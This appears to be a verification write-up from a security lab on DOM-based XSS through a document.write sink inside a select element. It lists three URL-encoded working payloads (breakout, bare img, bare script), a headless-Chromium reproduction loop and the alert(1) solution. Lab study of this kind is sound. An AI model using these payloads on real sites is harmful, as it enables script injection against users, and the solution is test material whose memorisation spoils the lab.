# Verification — DOM XSS in document.write inside select

## Methodology
1. Static review (curl): read the inline sink on the product page; note the exact
   wrapping (`<option selected>` in written `<select>`) rather than assuming body context.
2. SSR-absence proof: unique marker in `storeId`, grep raw response (must be 0).
3. Fire THREE payload shapes headlessly, each asserting on a distinct title marker:
   breakout+img, bare-img, bare-script.
4. Static-HTML control (`data:` URL) for the surprising result, isolating parser
   behavior from document.write behavior.
5. Rendered-DOM shape inspection per vector (where did each node land?).
6. Lab acceptance: real-browser breakout payload → `alert(1)`; banner polls.

## Evidence

### 1. Sink code (curl, `/product?productId=1`) — see attack-chain.md for listing.
Wrapping: value inside `<option selected>` inside written `<select name="storeId">`.

### 2. SSR absence (curl)
```
GET /product?productId=1&storeId=SRVMARKxyz → 0 occurrences in raw response
```
Pure DOM sink.

### 3. Vector A — breakout (headless dump-dom)
```
storeId=%3C/select%3E%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27SELBREAK%27%3E
→ <title>SELBREAK</title>
→ DOM: …<option selected=""></option></select><img src="x" onerror="…">…
```
`</select>` popped to body; body-level img fired.

### 4. Vector B — bare img in option (headless dump-dom)
```
storeId=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27SELIMG%27%3E
→ <title>SELIMG</title>
→ DOM: <select …><option selected=""><img src="x" onerror="…"></option>…
```
No breakout, still fires — against the textbook expectation.

### 5. Static control (headless dump-dom, no document.write involved)
```
data:text/html,<select><option><img src=x onerror=document.title="STATICIMG"></option></select>
→ <title>STATICIMG</title>
→ DOM: <option><img src="x" onerror="…"></option>
```
Proves the leniency is general parser behavior (foreign element accepted as option
child + handler executes), not a document.write artifact.

### 6. Vector C — bare script in select context (headless dump-dom)
```
storeId=%3Cscript%3Edocument.title%3D%27SELSCRIPT%27%3C/script%3E
→ <title>SELSCRIPT</title>
```
Parser-inserted `<script>` in select context executes (contrast: `innerHTML`-inserted
scripts are neutered — sink semantics still matter, wrapper context doesn't save you).

### 7. Lab acceptance
Real browser → `/product?productId=1&storeId=%3C/select%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
→ `alert(1)` on load → banner `is-solved` (first poll).

### 8. Failed-candidate analysis
| Candidate | Result | Why |
|---|---|---|
| Assuming breakout-necessity, testing ONLY `</select>` payloads | would have solved but taught nothing | the assumption is false on current Chrome; the extra vectors were found only by testing the "impossible" shapes |
| `onfocus`/`autofocus` inside option | untested, unnecessary | load-time fire already achieved three ways; left as PLAUSIBLE |
| Server-side reflection angle | 0 occurrences — no such angle | pure DOM |
| `/product/stock` POST tampering | NOT TESTED — outside this primitive's chain | stock check is a separate feature; no CSRF token observed on its form, but assessing it is a different lab/task |

## Reproducibility
```
BASE=…
A="$BASE/product?productId=1&storeId=%3C/select%3E%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27A%27%3E"
B="$BASE/product?productId=1&storeId=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27B%27%3E"
C="$BASE/product?productId=1&storeId=%3Cscript%3Edocument.title%3D%27C%27%3C/script%3E"
for u in "$A" "$B" "$C"; do chromium --headless --no-sandbox --dump-dom "$u" | grep -o "<title>[^<]*</title>"; done
# static control:
chromium --headless --no-sandbox --dump-dom 'data:text/html,<select><option><img src=x onerror=document.title="S"></option></select>' | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: all three vectors (distinct title markers), static-control isolation,
  rendered-DOM shapes, SSR absence, real-browser acceptance.
- Lesson encoded as rule: test the "impossible" payload shapes against restrictive
  wrappers — current-parser behavior beats remembered spec.